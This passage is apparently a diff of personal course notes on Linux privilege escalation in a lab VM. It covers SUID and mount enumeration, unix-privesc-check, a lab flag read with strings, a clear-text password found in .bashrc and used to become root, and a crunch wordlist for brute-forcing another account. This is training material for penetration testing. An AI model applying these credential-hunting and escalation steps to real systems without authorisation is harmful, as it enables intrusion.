+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
+/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
+/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket
+/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
+/dev/mqueue
+/dev/shm
+/var/tmp
+/usr/share/ppd/custom
+</code></pre>
+<ul>
+<li>several dirs are world writable<ul>
+<li>including <code>/home/joe/.scripts</code> which contains a cron script<ul>
+<li>this warrants further investigation</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>On most systems drives automatically mount at boot, but we should always look for unmounted drives which may contain valuable info.  If they exist, check the mount perms.  We can use <code>mount</code> to list all mounted FS and view <code>/etc/fstab</code> to list all drives mounted at boot time.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ cat /etc/fstab 
+# /etc/fstab: static file system information.
+#
+# Use &#39;blkid&#39; to print the universally unique identifier for a
+# device; this may be used with UUID= as a more robust way to name devices
+# that works even if disks are added and removed. See fstab(5).
+#
+# &lt;file system&gt; &lt;mount point&gt;   &lt;type&gt;  &lt;options&gt;       &lt;dump&gt;  &lt;pass&gt;
+# / was on /dev/sda1 during installation
+UUID=60b4af9b-bc53-4213-909b-a2c5e090e261 /               ext4    errors=remount-ro 0       1
+# swap was on /dev/sda5 during installation
+UUID=86dc11f3-4b41-4e06-b923-86e78eaddab7 none            swap    sw              0       0
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+
+joe@debian-privesc:~$ mount
+sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
+proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
+udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001064k,nr_inodes=250266,mode=755)
+devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
+tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=204196k,mode=755)
+/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
+securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
+tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
+tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
+tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
+cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
+cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
+pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
+bpf on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
+cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
+cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
+cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
+cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
+cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
+cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
+cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
+cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
+cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
+cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
+systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=34,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=9209)
+mqueue on /dev/mqueue type mqueue (rw,relatime)
+debugfs on /sys/kernel/debug type debugfs (rw,relatime)
+hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
+tmpfs on /run/user/117 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=117,gid=124)
+tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=1000,gid=1000)
+binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
+tracefs on /sys/kernel/debug/tracing type tracefs (rw,relatime)
+tmpfs on /run/user/1001 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=1001,gid=1001)
+</code></pre>
+<ul>
+<li>the output show the swap part and primary ext4 disk<ul>
+<li><em>Keep in mind that the system administrator might have used custom configurations or scripts to mount drives that are not listed in the /etc/fstab file. Because of this, it&#39;s good practice to not only scan /etc/fstab, but to also gather information about mounted drives using mount.</em></li>
+</ul>
+</li>
+</ul>
+<p>We can then use <code>lsblk</code> to view all disks.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ lsblk
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda      8:0    0   32G  0 disk 
+├─sda1   8:1    0   31G  0 part /
+├─sda2   8:2    0    1K  0 part 
+└─sda5   8:5    0  975M  0 part [SWAP]
+sr0     11:0    1 1024M  0 rom 
+</code></pre>
+<ul>
+<li>sda consists of 3 parts</li>
+<li>showing info for all disks may reveal parts that are not mounted<ul>
+<li>depending on config, we may be able to mount these and search for info</li>
+</ul>
+</li>
+</ul>
+<p>Another common method is to exploit device drivers and kernel modules, let&#39;s examine enumeration techniques.  Enumerate modules loaded on target with <code>lsmod</code>.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ lsmod
+Module                  Size  Used by
+binfmt_misc            20480  1
+crct10dif_pclmul       16384  0
+vmw_balloon            20480  0
+crc32_pclmul           16384  0
+joydev                 24576  0
+ghash_clmulni_intel    16384  0
+serio_raw              16384  0
+pcspkr                 16384  0
+sg                     36864  0
+vmw_vsock_vmci_transport    32768  1
+vsock                  40960  2 vmw_vsock_vmci_transport
+vmw_vmci               81920  2 vmw_balloon,vmw_vsock_vmci_transport
+evdev                  28672  6
+ac                     16384  0
+nft_counter            16384  1
+xt_tcpudp              16384  1
+nft_compat             20480  1
+nf_tables             143360  5 nft_compat,nft_counter
+nfnetlink              16384  2 nft_compat,nf_tables
+parport_pc             32768  0
+ppdev                  20480  0
+lp                     20480  0
+parport                57344  3 parport_pc,lp,ppdev
+ip_tables              28672  0
+x_tables               45056  3 nft_compat,xt_tcpudp,ip_tables
+autofs4                49152  2
+ext4                  749568  1
+crc16                  16384  1 ext4
+mbcache                16384  1 ext4
+jbd2                  122880  1 ext4
+crc32c_generic         16384  0
+fscrypto               32768  1 ext4
+ecb                    16384  0
+sr_mod                 28672  0
+cdrom                  65536  1 sr_mod
+ata_generic            16384  0
+crc32c_intel           24576  2
+sd_mod                 61440  3
+vmwgfx                331776  3
+aesni_intel           200704  0
+ttm                   126976  1 vmwgfx
+drm_kms_helper        208896  1 vmwgfx
+ata_piix               36864  0
+aes_x86_64             20480  1 aesni_intel
+crypto_simd            16384  1 aesni_intel
+cryptd                 28672  3 crypto_simd,ghash_clmulni_intel,aesni_intel
+glue_helper            16384  1 aesni_intel
+drm                   495616  6 vmwgfx,drm_kms_helper,ttm
+psmouse               172032  0
+libata                270336  2 ata_piix,ata_generic
+vmw_pvscsi             28672  2
+scsi_mod              249856  5 vmw_pvscsi,sd_mod,libata,sg,sr_mod
+vmxnet3                69632  0
+i2c_piix4              24576  0
+button                 20480  0
+</code></pre>
+<p>Once we list loaded mods and ID interesting ones, we can see more info with <code>modinfo</code> (requires full path to run).</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ /sbin/modinfo libata
+filename:       /lib/modules/4.19.0-21-amd64/kernel/drivers/ata/libata.ko
+version:        3.00
+license:        GPL
+description:    Library module for ATA devices
+author:         Jeff Garzik
+srcversion:     00E4F01BB3AA2AAF98137BF
+depends:        scsi_mod
+retpoline:      Y
+intree:         Y
+name:           libata
+vermagic:       4.19.0-21-amd64 SMP mod_unload modversions 
+sig_id:         PKCS#7
+signer:         Debian Secure Boot CA
+sig_key:        4B:6E:F5:AB:CA:66:98:25:17:8E:05:2C:84:66:7C:CB:C0:53:1F:8C
+sig_hashalgo:   sha256
+signature:      89:BC:89:3C:6B:C9:55:B9:EC:9C:AD:D8:8A:76:C5:0D:8C:F0:88:26:
+        2C:09:B9:36:34:FE:B0:5D:0D:84:BA:10:B9:12:3A:C6:41:C5:90:66:
+        46:09:7B:33:91:7B:E6:E3:F2:F7:B9:E7:5D:E7:E1:F9:8D:8F:DF:31:
+        21:47:B3:76:90:4E:F1:45:2E:65:6F:63:61:B9:5D:53:40:84:96:F5:
+        61:1A:1A:2D:EF:5B:82:65:BD:24:60:AD:DB:68:60:F8:F2:3F:CD:11:
+        DC:D5:7B:61:81:A3:6C:95:46:09:6C:CB:F0:66:FC:40:55:17:F2:71:
+        7F:B8:43:0B:07:2A:79:FB:A7:CD:FF:C6:34:4D:78:5B:71:53:2C:0F:
+        0A:BC:AE:3C:6F:38:3A:5E:CB:26:96:6B:9B:C7:BE:C7:6F:C8:9D:88:
+        93:61:B9:12:2F:AC:4B:D1:F0:23:30:AD:A5:B1:30:A7:4A:EA:96:5F:
+        26:DF:B3:73:AD:00:3D:B5:9D:B1:3C:C7:01:D9:A8:86:73:EE:A8:4D:
+        2B:62:AD:2B:B8:DE:0A:33:F6:3D:13:29:36:17:A7:14:F1:C5:C5:11:
+        37:60:52:31:9E:B4:BD:B1:64:A5:5E:47:3E:D2:5F:77:89:74:2E:E2:
+        47:5B:22:34:C7:F7:A5:81:A1:BF:BA:72:A0:E5:CF:69
+parm:           zpodd_poweroff_delay:Poweroff delay for ZPODD in seconds (int)
+parm:           acpi_gtf_filter:filter mask for ACPI _GTF commands, set to filter out (0x1=set xfermode, 0x2=lock/freeze lock, 0x4=DIPM, 0x8=FPDMA non-zero offset, 0x10=FPDMA DMA Setup FIS auto-activate) (int)
+parm:           force:Force ATA configurations including cable type, link speed and transfer mode (see Documentation/admin-guide/kernel-parameters.rst for details) (string)
+parm:           atapi_enabled:Enable discovery of ATAPI devices (0=off, 1=on [default]) (int)
+parm:           atapi_dmadir:Enable ATAPI DMADIR bridge support (0=off [default], 1=on) (int)
+parm:           atapi_passthru16:Enable ATA_16 passthru for ATAPI devices (0=off, 1=on [default]) (int)
+parm:           fua:FUA support (0=off [default], 1=on) (int)
+parm:           ignore_hpa:Ignore HPA limit (0=keep BIOS limits, 1=ignore limits, using full disk) (int)
+parm:           dma:DMA enable/disable (0x1==ATA, 0x2==ATAPI, 0x4==CF) (int)
+parm:           ata_probe_timeout:Set ATA probing timeout (seconds) (int)
+parm:           noacpi:Disable the use of ACPI in probe/suspend/resume (0=off [default], 1=on) (int)
+parm:           allow_tpm:Permit the use of TPM commands (0=off [default], 1=on) (int)
+parm:           atapi_an:Enable ATAPI AN media presence notification (0=0ff [default], 1=on) (int)
+</code></pre>
+<ul>
+<li>this info better positions us to find appropriate exploits</li>
+</ul>
+<p>There are a few enumerations to be aware of that may provide a <strong>shortcut to PriveEsc</strong>.  Other than <code>rwx</code> file perms there are two <em>special rights</em> pertaining to exec files:</p>
+<ul>
+<li><code>setuid</code> and <code>setgid</code><ul>
+<li>symbolized with upper or lower case <code>s</code></li>
+<li>allows current user to exec the file with rights of the owner (setuid) or the owner&#39;s group (setgid)</li>
+</ul>
+</li>
+</ul>
+<p>When run, an exec normally inherits the rights of the user that runs it.  If SUID perms are set, the bin will run with the perms of the file owner.</p>
+<ul>
+<li>If a bin has the SUID bit set and the owner is root<ul>
+<li>local user exec that bin with elevated priv</li>
+</ul>
+</li>
+<li>when user or automate script launches SUID app<ul>
+<li>it inherits the UID/GID of initiating script<ul>
+<li>known as the <strong>&quot;effective UID/GID&quot; or eUID/eGID</strong><ul>
+<li>which is the user the OS verifies to grant perms for the action</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>manage to subvert a setuid root program to call a command of choice<ul>
+<li>effectively impersonate the root user</li>
+<li>common method of PrivEsc</li>
+</ul>
+</li>
+</ul>
+<p>We can use <code>find</code> to search for SUID-marked bins:</p>
+<ul>
+<li><code>/</code> search root</li>
+<li><code>-type f</code> for files</li>
+<li><code>-perm -u=s</code> with SUID bit set</li>
+<li><code>2&gt;/dev/null</code> discard errors</li>
+</ul>
+<pre><code class="language-bash">joe@debian-privesc:~$ find / -perm -u=s -type f 2&gt;/dev/null
+/usr/bin/find
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/sudo
+/usr/bin/pkexec
+/usr/bin/ntfs-3g
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/bwrap
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/mount
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pppd
+</code></pre>
+<ul>
+<li>we found server SUID bins</li>
+<li>Exploitation varies on several factors<ul>
+<li>if <code>/bin/cp</code> were SUID we could copy/overwrite sensitive files like <code>/etc/passwd</code></li>
+</ul>
+</li>
+</ul>
+<p>A full list of Linux PrivEsc techniques can be found in a compendium by g0tmi1k as well as many other resources:</p>
+<ul>
+<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation">G0tmi1k compendium</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">Swissky</a></li>
+<li><a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Carlos Polop</a></li>
+</ul>
+<h4>Exercises</h4>
+<p>Connect to VM 2 with the provided credentials. The flag is inside one of the SUID binaries available on the system.
+<strong>Use &quot;strings&quot; to display readable strings in bin</strong></p>
+<pre><code class="language-bash">joe@debian-privesc:~$ strings /usr/bin/passwd_flag
+/lib64/ld-linux-x86-64.so.2
+mfUa
+libpam.so.0
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+pam_start
+pam_strerror
+pam_chauthtok
+pam_end
+libpam_misc.so.0
+misc_conv
+libaudit.so.1
+_fini
+_init
+libselinux.so.1
+is_selinux_enabled
+security_getenforce
+context_user_get
+security_compute_av
+matchpathcon
+freecon
+context_free
+setfscreatecon
+context_new
+getprevcon
+libc.so.6
+setuid
+chroot
+fflush
+strcpy
+fchmod
+__printf_chk
+exit
+_IO_putc
+setlocale
+fopen
+strncmp
+optind
+getpwent
+strrchr
+setregid
+perror
+dcgettext
+signal
+strncpy
+fork
+setreuid
+__stack_chk_fail
+__lxstat
+unlink
+putspent
+realloc
+fsync
+stdin
+strtoll
+getpid
+kill
+strspn
+strdup
+strftime
+__assert_fail
+gmtime
+endpwent
+strtol
+feof
+fgets
+calloc
+strlen
+openlog
+memset
+strcspn
+__errno_location
+fseek
+chdir
+read
+__syslog_chk
+__fprintf_chk
+getgrnam
+getpwuid_r
+fchown
+stdout
+fputc
+fputs
+fclose
+strtoul
+malloc
+umask
+strcasecmp
+realpath
+__fgets_chk
+__strncpy_chk
+getgid
+getspnam
+__ctype_b_loc
+__open_2
+optarg
+stderr
+__snprintf_chk
+getlogin
+getuid
+execve
+setrlimit
+getopt_long
+getpwnam_r
+__fxstat
+fileno
+rename
+geteuid
+__memcpy_chk
+waitpid
+sgetspent
+strchr
+utime
+fdopen
+qsort
+__cxa_finalize
+fcntl
+__xstat
+bindtextdomain
+access
+_IO_getc
+ulckpwdf
+strcmp
+__libc_start_main
+setpwent
+ferror
+write
+closelog
+snprintf
+putpwent
+__environ
+_edata
+__bss_start
+LIBPAM_MISC_1.0
+LIBPAM_1.0
+GLIBC_2.3
+GLIBC_2.4
+GLIBC_2.7
+GLIBC_2.3.4
+GLIBC_2.2.5
+D$81
+T$8dH3
+H[]A\A]A^A_
+\$ 1
+|$ H
+l$ L
+u/UH
+ATUS
+AWAVAUATI
+AVAU
+[]A\A]A^A_
+&lt;*tE&lt;!tA
+;!ukH
+?!uG
+ATUS
+AWAVAUI
+ATUSH
+H;\$
+[]A\A]A^A_
+[]A\A]A^A_
+[]A\A]A^A_
+AWAVAUATUSH
+[]A\A]A^A_
+AVAUATUSH
+[]A\A]A^A_
+AWE1
+AVAUA
+[]A\A]A^A_
+AWAVI
+AUATUSH
+L9d$
+?&quot;u%H
+([]A\A]A^A_
+AWAVA
+AUATUSH
+L9d$
+?&quot;u%H
+([]A\A]A^A_
+&quot;t	I
+[]A\
+D$81
+|$ H
+L$8dH3
+D$81
+D$ H
+D$(H
+D$0H
+\$8dH3
+tbUH
+ATUH
+[]A\
+[]A\
+[]A\A]A^
+tSATI
+[]A\
+AVAUATI
+[]A\A]A^
+[]A\A]A^
+AWAVAUATUSH
+[]A\A]A^A_
+AWAVAUA
+ATUSH
+[]A\A]A^A_
+T$ H
+T$ H
+LcL$
+AWAVAUATU
+P(L9
+[]A\A]A^A_
+AVAUATUSH
+[]A\A]A^A_
+AWAVAUATUSH
+[]A\A]A^A_
+AVAUATUS
+]A\A]A^
+[]A\A]A^
+[]A\A]A^
+AUATUSH
+[]A\A]
+[]A\A]
+[]A\A]
+[]A\A]
+AUATI
+[]A\A]
+[]A\A]
+[]A\A]
+AVAUI
+ATUSH
+[]A\A]A^
+ATUSH
+[]A\A]
+[]A\
+[]A\
+[]A\
+[]A\
+dH3&lt;%(
+[]A\
+dH3&lt;%(
+[]A\
+dH3&lt;%(
+[]A\
+&quot;t	I
+[]A\
+AWAVI
+AUATL
+[]A\A]A^A_
+Usage: %s [options] [LOGIN]
+Options:
+OS{17c5475686f3dd59a90be4dca6fdcf85}
+  -a, --all                     report password status on all accounts
+  -d, --delete                  delete the password for the named account
+  -e, --expire                  force expire the password for the named account
+  -h, --help                    display this help message and exit
+  -k, --keep-tokens             change password only if expired
+  -i, --inactive INACTIVE       set password inactive after expiration
+                                to INACTIVE
+  -l, --lock                    lock the password of the named account
+  -n, --mindays MIN_DAYS        set minimum number of days before password
+                                change to MIN_DAYS
+  -q, --quiet                   quiet mode
+  -r, --repository REPOSITORY   change password in REPOSITORY repository
+  -R, --root CHROOT_DIR         directory to chroot into
+  -S, --status                  report password status on the named account
+  -u, --unlock                  unlock the password of the named account
+  -w, --warndays WARN_DAYS      set expiration warning days to WARN_DAYS
+  -x, --maxdays MAX_DAYS        set maximum number of days before password
+                                change to MAX_DAYS
+%s: unlocking the password would result in a passwordless account.
+You should set a password with usermod -p to unlock the password of this account.
+%s: cannot lock %s; try again later.
+%s: user &#39;%s&#39; does not exist in %s
+%s: failed to prepare the new %s entry &#39;%s&#39;
+%s: failure while writing changes to %s
+failure while writing changes to %s
+%s: invalid numeric argument &#39;%s&#39;
+%s: repository %s not supported
+%s: Cannot determine your user name.
+Cannot determine the user name of the caller (UID %lu)
+%s is not authorized to change the password of %s
+%s: %s is not authorized to change the password of %s
+%s: You may not view or modify password information for %s.
+%s: can&#39;t view or modify password information for %s
+password for &#39;%s&#39; changed by &#39;%s&#39;
+%s: password expiry information changed.
+%s: failed to unlock %s
+failed to unlock %s
+%s: out of memory
+%m/%d/%Y
+%s %s %s %lld %lld %lld %lld
+%s %s
+%s: cannot open %s
+cannot open %s
+Unknown user context
+/usr/share/locale
+shadow
+passwd
+files
+adehi:kln:qr:R:Suw:x:
+%s: Permission denied.
+%s: user &#39;%s&#39; does not exist
+Cannot change ID to root.
+can&#39;t setuid(0)
+group
+delete
+expire
+help
+inactive
+keep-tokens
+mindays
+quiet
+repository
+status
+unlock
+warndays
+maxdays
+%s=%s
+env.c
+wlen == (int) len -1
+Environment overflow
+You may not change $%s
+LANG=
+LANGUAGE=
+_RLD_=
+BASH_ENV=
+HOME=
+IFS=
+KRB_CONF=
+LIBPATH=
+MAIL=
+NLSPATH=
+SHELL=
+SHLIB_PATH=
+addenv
+passwd: %s
+passwd: password unchanged
+passwd: pam_start() failed, error %d
+passwd: password updated successfully
+--root
+%s: multiple --root options
+%s: invalid chroot path &#39;%s&#39;
+%s: option &#39;%s&#39; requires an argument
+%s: failed to drop privileges (%s)
+%s: cannot access chroot directory %s: %s
+%s: cannot chdir to chroot directory %s: %s
+%s: unable to chroot to directory %s: %s
+xgetpwnam
+xgetpwuid
+%s: failed to allocate memory: %s
+/usr/sbin/nscd
+%s: Failed to flush the nscd cache.
+%s: nscd did not terminate normally (signal %d)
+%s: nscd exited with status %d
+FORCE_SHADOW
+%s: cannot execute %s: %s
+commonio.c
+NULL != eptr
+realpath in lrename()
+%s.%lu
+%s.lock
+%s: %s: %s
+%s: cannot get lock %s: %s
+%s: %s: lock file already used
+%s: existing lock file %s without a PID
+%s: existing lock file %s with an invalid PID &#39;%s&#39;
+%s: lock %s already used by PID %lu
+Multiple entries named &#39;%s&#39; in %s. Please fix this with pwck or grpck.
+write_all
+    %s [%s]: 
+configuration error - unknown item &#39;%s&#39; (notify administrator)
+unknown configuration item `%s&#39;
+Could not allocate space for config info.
+could not allocate space for config info
+cannot open login definitions %s [%s]
+cannot read login definitions %s [%s]
+configuration error - cannot parse %s value: &#39;%s&#39;
+CHFN_AUTH
+CHSH_AUTH
+CRACKLIB_DICTPATH
+ENV_HZ
+ENVIRON_FILE
+ENV_TZ
+FAILLOG_ENAB
+ISSUE_FILE
+LASTLOG_ENAB
+LOGIN_STRING
+MAIL_CHECK_ENAB
+MOTD_FILE
+NOLOGINS_FILE
+OBSCURE_CHECKS_ENAB
+PASS_ALWAYS_WARN
+PASS_CHANGE_TRIES
+PASS_MAX_LEN
+PASS_MIN_LEN
+PORTTIME_CHECKS_ENAB
+QUOTAS_ENAB
+SU_WHEEL_ONLY
+ULIMIT
+CHFN_RESTRICT
+CONSOLE_GROUPS
+CONSOLE
+CREATE_HOME
+DEFAULT_HOME
+ENCRYPT_METHOD
+ENV_PATH
+ENV_SUPATH
+ERASECHAR
+FAKE_SHELL
+FTMP_FILE
+HUSHLOGIN_FILE
+KILLCHAR
+LOGIN_RETRIES
+LOGIN_TIMEOUT
+LOG_OK_LOGINS
+LOG_UNKFAIL_ENAB
+MAIL_DIR
+MAIL_FILE
+MAX_MEMBERS_PER_GROUP
+MD5_CRYPT_ENAB
+PASS_MAX_DAYS
+PASS_MIN_DAYS
+PASS_WARN_AGE
+SHA_CRYPT_MAX_ROUNDS
+SHA_CRYPT_MIN_ROUNDS
+SUB_GID_COUNT
+SUB_GID_MAX
+SUB_GID_MIN
+SUB_UID_COUNT
+SUB_UID_MAX
+SUB_UID_MIN
+SULOG_FILE
+SU_NAME
+SYS_GID_MAX
+SYS_GID_MIN
+SYS_UID_MAX
+SYS_UID_MIN
+TTYGROUP
+TTYPERM
+TTYTYPE_FILE
+UMASK
+USERDEL_CMD
+USERGROUPS_ENAB
+SYSLOG_SG_ENAB
+SYSLOG_SU_ENAB
+;*3$&quot;
+/etc/passwd
+/etc/shadow
+/etc/login.defs
+0e83d497675cb24e003f9d993c1770502483e8.debug
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.gnu_debuglink
+</code></pre>
+<h3>Automated Enumeration</h3>
+<p>To obtain an initial baseline of the target, we can use <code>unix-privesc-check</code> on UNIX derivatives like Linux.  This is pre installed on Kali and available at <code>/usr/bin/unix-privesc-check</code>.  It performs a number of checks to find any sys misconfigs that can be leveraged for PrivEsc.  Run the script without any args to review the tool&#39;s details.</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ /usr/bin/unix-privesc-check              
+unix-privesc-check v1.4 ( http://pentestmonkey.net/tools/unix-privesc-check )
+
+Usage: unix-privesc-check { standard | detailed }
+
+&quot;standard&quot; mode: Speed-optimised check of lots of security settings.
+
+&quot;detailed&quot; mode: Same as standard mode, but also checks perms of open file
+                 handles and called files (e.g. parsed from shell scripts,
+                 linked .so files).  This mode is slow and prone to false 
+                 positives but might help you find more subtle flaws in 3rd
+                 party programs.
+
+This script checks file permissions and other settings that could allow
+local users to escalate privileges.
+
+Use of this script is only permitted on systems which you have been granted
+legal permission to perform a security assessment of.  Apart from this 
+condition the GPL v2 applies.
+
+Search the output for the word &#39;WARNING&#39;.  If you don&#39;t see it then this
+script didn&#39;t find any problems.
+</code></pre>
+<ul>
+<li>the script has two modes<ul>
+<li><code>standard</code><ul>
+<li>performs a speed optimized process and should reduce the number of false positives</li>
+</ul>
+</li>
+<li><code>detailed</code><ul>
+<li>also checks perms of open file handles and called files.  slow and prone to false positive, but may help to find subtle flaws in 3rd party programs</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>In this example we will transfer the script to the target and use <code>standard</code> mode, redirect the output to a file called <code>output.txt</code>.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ bash unix-privesc-check standard &gt; output.txt
+</code></pre>
+<p>The script performs numerous checks for permissions on common files.  The following excerpt reveals config files writable by normal users.</p>
+<pre><code>############################################
+Checking for writable config files
+############################################
+    Checking if anyone except root can change /etc/passwd
+WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
+    Checking if anyone except root can change /etc/group
+    Checking if anyone except root can change /etc/fstab
+    Checking if anyone except root can change /etc/profile
+    Checking if anyone except root can change /etc/sudoers
+WARNING: /etc/sudoers is a critical config file. World write is set for /etc/sudoers
+    Checking if anyone except root can change /etc/shadow
+</code></pre>
+<ul>
+<li>the output shows anyone can edit <code>/etc/passwd</code><ul>
+<li>this easily allows an attacker to PrivEsc or create accounts on the target</li>
+</ul>
+</li>
+</ul>
+<p>There are many other tools worth studying, which have been actively developed and enhanced over years.</p>
+<ul>
+<li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
+<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPeas</a></li>
+</ul>
+<p>All of these tools perform many automated checks, but we should remember that every system is different, one-off system changes can be missed by automated tools.  It is always important to check for unique configs that can only be enumerated manually.</p>
+<h2>Exposed Confidential Information 17.2</h2>
+<ul>
+<li>Understand user history files</li>
+<li>Inspect user trails for credential harvesting</li>
+<li>Inspect system trails for credential harvesting</li>
+</ul>
+<h3>Inspecting User Trails</h3>
+<p>There are often time constraints during engagements, always focus efforts on low hanging fruit first.</p>
+<p>The target&#39;s user <code>history</code> file often hold clear-text user activity that may include sensitive info, such as passwords or other auth details.</p>
+<p>On Linux, applications frequently store user-specific config files and sub-dirs in the user home dir.  Often called &quot;dotfiles&quot;, they are prepended with a &quot;.&quot;, instructing the system not to display the files when listing with basic commands.</p>
+<p>One example is the <code>.bashrc</code>, which is executed on new terminal windows from existing login sessions or when a new shell instance is started.  Withing the script, env vars can be set when a new user shell is spawned.</p>
+<p>Sys admins sometimes store creds in env vars to interact with custom scripts requiring auth.  If we review the env vars of our lab Vm we will notice an unusual env var:</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ env
+...
+XDG_SESSION_CLASS=user
+TERM=xterm-256color
+SCRIPT_CREDENTIALS=lab
+USER=joe
+LC_TERMINAL_VERSION=3.4.16
+SHLVL=1
+XDG_SESSION_ID=35
+LC_CTYPE=UTF-8
+XDG_RUNTIME_DIR=/run/user/1000
+SSH_CLIENT=192.168.118.2 59808 22
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
+MAIL=/var/mail/joe
+SSH_TTY=/dev/pts/1
+OLDPWD=/home/joe/.cache
+_=/usr/bin/env
+</code></pre>
+<ul>
+<li>the <code>SCRIPT_CREDENTIAL</code> var holds something resembling a password</li>
+</ul>
+<p>To confirm this is a permanent var, inspect the <code>.bashrc</code> conf file.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ cat .bashrc | grep export
+export SCRIPT_CREDENTIALS=&quot;lab&quot;
+#export GCC_COLORS=&#39;error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01&#39;
+</code></pre>
+<ul>
+<li>the var holding the pass is exported when the user shell starts
+<em>Storing a clear-text password inside an environment variable is not considered a secure best practice. To safely authenticate with an interactive script, it&#39;s recommended to adopt public key authentication and protect private keys with passphrases.</em></li>
+</ul>
+<p>Let&#39;s try to PrivEsc by directly entering the password we discovered.</p>
+<pre><code class="language-bash">joe@debian-privesc:~$ su - root
+Password: 
+root@debian-privesc:~# whoami
+root
+</code></pre>
+<p>Instead of going directly for the root account, we could try to access user <code>eve</code> we previously discovered.  We can try building a custom dict from know passwords to attempt to brute force eve&#39;s account.</p>
+<p>We can generate the wordlist with the <code>crunch</code> CLI tool.  Set min and max len to <code>6</code> chars, specify pattern with <code>-t</code>, then hard code the first 3 chars to <code>lab</code>, followed by 3 digits.</p>
+<pre><code class="language-bash">┌──(m4xx3d0ut㉿h4ckt0p)-[~/OffSec/lin-priv-esc]
+└─$ crunch 6 6 -t Lab%%% &gt; wordlist  
+Crunch will now generate the following amount of data: 7000 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 1000 
+                                                                                         
